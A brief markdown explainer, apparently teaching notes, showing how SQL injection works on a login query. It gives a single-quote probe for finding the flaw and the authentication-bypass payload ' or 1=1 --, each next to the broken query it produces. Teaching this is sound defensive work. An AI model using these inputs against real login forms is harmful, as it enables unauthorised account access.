# SQL Injection

Password:

```
password
```

Result:

```sql
SELECT *
FROM users
WHERE
    email = 'user@email.com'
    AND pass  = 'password' LIMIT 1
```

---

Use this to check for vulnerability.

Password:

```
'
```

Result:

```sql
SELECT *
FROM users
WHERE
    email = 'user@email.com'
    -- ERROR
    AND pass  = ''' LIMIT 1
```

---

This returns a session / JWT token

Password:

```sql
' or 1=1 --
```

Result:

```sql
SELECT *
FROM users
WHERE
    email = 'user@email.com'
    AND pass  = '' or 1=1 --' LIMIT 1

```
